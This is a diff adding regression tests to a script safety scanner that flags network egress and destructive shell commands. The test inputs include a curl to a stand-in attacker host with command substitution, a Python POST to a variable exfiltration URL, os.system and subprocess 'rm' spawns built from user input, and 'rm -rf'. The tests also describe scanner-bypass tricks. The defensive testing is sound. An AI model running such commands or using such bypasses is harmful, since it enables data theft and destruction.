@@ -82,6 +82,20 @@ def test_uncertain_egress_downgraded_to_review() -> None:
     assert report.decision is SafetyDecision.NEEDS_HUMAN_REVIEW
 
 
+def test_unbalanced_quote_curl_still_detected() -> None:
+    """An unpaired quote must not hide a downloader egress.
+
+    ``shlex.split`` raises on the unbalanced quote and the bash layer falls back
+    to naive splitting, but egress is still caught: domains are extracted from
+    the raw line by regex and the NET001 L1 rule matches ``curl`` directly, so
+    the non-whitelisted destination is denied.
+    """
+    report = _scan('curl "https://evil.example.com/$(id)\n', ScriptLanguage.BASH)
+    assert report.decision is SafetyDecision.DENY
+    ids = report.rule_ids()
+    assert "SH021" in ids or "NET001" in ids
+
+
 def test_whitelisted_line_does_not_mask_other_egress() -> None:
     """Per-line domain resolution: a whitelisted URL must not mask another egress.
 
@@ -96,6 +110,31 @@ def test_whitelisted_line_does_not_mask_other_egress() -> None:
     )
     report = _scan(script, ScriptLanguage.PYTHON)
     assert report.decision is SafetyDecision.NEEDS_HUMAN_REVIEW
+
+
+def test_same_line_whitelisted_url_does_not_mask_dynamic_egress() -> None:
+    """A whitelisted URL literal on the hit line must not unblock a dynamic egress.
+
+    Regression for the single-line masking bypass: the POST destination is a
+    variable (unverifiable), but an allow-listed URL sits in ``headers`` on the
+    *same* line. Domain-aware refinement would drop the high AST004/NET001 hits
+    as "all destinations allow-listed"; the medium AST009 hit must survive so the
+    verdict is review, never a silent allow.
+    """
+    script = ("import requests\n"
+              'requests.post(exfil_url, headers={"x": "https://api.openai.com"})\n')
+    report = _scan(script, ScriptLanguage.PYTHON)
+    assert report.decision is SafetyDecision.NEEDS_HUMAN_REVIEW
+    assert "AST009" in report.rule_ids()
+
+
+def test_literal_whitelisted_egress_stays_allowed() -> None:
+    """A fully-literal allow-listed destination is still allowed (no AST009 noise)."""
+    script = ("import requests\n"
+              'requests.post("https://api.openai.com/v1/chat", json=payload)\n')
+    report = _scan(script, ScriptLanguage.PYTHON)
+    assert report.decision is SafetyDecision.ALLOW
+    assert "AST009" not in report.rule_ids()
 
 
 def test_overlapping_regex_hit_is_deduped() -> None:
@@ -128,6 +167,46 @@ def test_python_source_autodetected() -> None:
     """Parseable Python with no shell hints is detected as Python."""
     report = _scan("def f(x):\n    return x + 1\n")
     assert report.language is ScriptLanguage.PYTHON
+
+
+def test_python_with_command_word_literal_not_misdetected_as_bash() -> None:
+    """A Python call whose string literal contains ``rm`` stays Python and denies.
+
+    Regression for the language-detection bypass: the bash substring heuristic
+    matched ``rm`` inside the Python string literal and short-circuited to Bash,
+    skipping the AST layer so the dynamic ``os.system`` spawn was silently
+    allowed. Detection must route this to Python, where AST001/AST008 fire.
+    """
+    for script in ('os.system("rm " + path)\n', 'subprocess.call("rm " + user_input)\n'):
+        report = _scan(script)
+        assert report.language is ScriptLanguage.PYTHON, script
+        assert report.decision is SafetyDecision.DENY, script
+        assert "AST001" in report.rule_ids(), script
+        assert "AST008" in report.rule_ids(), script
+
+
+def test_static_python_mentioning_commands_is_allowed_python() -> None:
+    """A benign, fully-static Python line mentioning a shell word is still Python.
+
+    The literal ``rm`` trips the bash substring heuristic but no regex rule (it
+    lacks the ``-rf`` flag FS001 needs), so this isolates language priority: the
+    script must be routed to Python and, having no dangerous call, allowed.
+    """
+    report = _scan('print("run rm to clean the temp directory")\n')
+    assert report.language is ScriptLanguage.PYTHON
+    assert report.decision is SafetyDecision.ALLOW
+
+
+def test_bash_command_parsing_as_python_expression_stays_bash() -> None:
+    """A destructive bash command that happens to parse as Python is still Bash.
+
+    ``rm -rf /tmp/x`` satisfies Python's grammar as a subtraction/division of
+    names, so a naive "ast.parse first" would misroute it to the Python layer
+    and skip FS001. Requiring real Python constructs keeps it on the bash path.
+    """
+    report = _scan("rm -rf /tmp/data\n")
+    assert report.language is ScriptLanguage.BASH
+    assert report.decision is SafetyDecision.DENY
 
 
 # -- performance ------------------------------------------------------------
